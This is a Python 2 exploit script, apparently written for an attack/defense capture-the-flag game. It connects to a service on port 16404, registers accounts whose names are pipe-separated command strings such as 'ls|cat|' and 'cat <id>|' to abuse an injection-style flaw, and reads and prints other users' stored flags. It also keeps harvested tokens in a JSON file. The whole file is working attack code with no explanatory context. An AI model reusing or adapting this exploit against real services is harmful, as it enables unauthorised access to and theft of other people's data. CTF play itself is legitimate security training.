#!/usr/bin/env python2


import socket,sys,string,random,re,os.path,json

TIMEOUT = 1
def id_gen(size=12, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
def readall(s):
    mes=''
    try:
        while 1:
            m = s.recv(1)
            mes += m
    except socket.timeout:
        return mes
def snd(s,p):
    #print(">",p)
    s.send(p)
def dbg(s):
    return
    print(s)
ip = sys.argv[1]
port = 16404
data={}
data_name = "data_%s.json" % ip
if os.path.isfile(data_name):
    data = json.load(open(data_name))
if not ip in data :
    data[ip] = {'flag_ids':[],'ids_pending':[],'ls_cred':[]}
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(TIMEOUT)
s.connect((ip,port))
dbg(readall(s))
auth=0
ls_toks = ['ls|',"ls|cat|","ls|cat|cat|","ls|cat|cat|cat|","id|id|ls|","id|ls|cat|cat|","rm|ls|cat|cat|","rm|ls|cat|cat|","ls|cat|"]
for tok in data[ip]['ls_cred']:
    s.send("auth\n")
    dbg(readall(s))
    s.send(tok+"\n")
    res = readall(s)
    dbg (res)
    if "Wrong" in res:
        continue
    dbg("Found ls acc "+tok)
    auth = 1
    break
if auth != 1:
    dbg("Creating ls acc")
    for ls_name in ls_toks:
        s.send("reg\n")
        dbg(readall(s))
        s.send(ls_name+"\n")
        res = readall(s)
        if "not created" in res:
            continue
        rr = re.findall(r'token is ([0-9A-Za-z+=/]+)',res)
        # print(res)
        data[ip]['ls_cred'].append(rr[0])
        auth = 1
        break
    if auth !=1:
        dbg("Cannot reg or auth ls acc");
        quit()
s.send("read\n")
res = readall(s)
ids = res.split("\n")[1:]
dbg (ids)
s.close()
for fid in ids:
    if fid in data[ip]['flag_ids']:
        continue
    data[ip]['ids_pending'].append(fid)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(TIMEOUT)
s.connect((ip,port))
dbg(readall(s))
for i in range(50):
    if len(data[ip]['ids_pending']) == 0:
        break;
    fid = random.choice(data[ip]['ids_pending'])
    data[ip]['ids_pending'].remove(fid)
    data[ip]['flag_ids'].append(fid)
    snd(s,"reg\n")
    dbg(readall(s))
    snd(s,"cat %s|\n" % fid)
    res=readall(s)
    dbg(res)
    if "not created" in res:
        continue
    snd(s,"read\n")
    res = readall(s)
    s.close()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((ip,port))
    dbg(res)
    flgs = res.split("\n")
    print (flgs[1])
    sys.stdout.flush()
    json.dump(data,open(data_name,'w+'))
print("Pending ids",len(data[ip]['ids_pending']))
json.dump(data,open(data_name,'w+'))
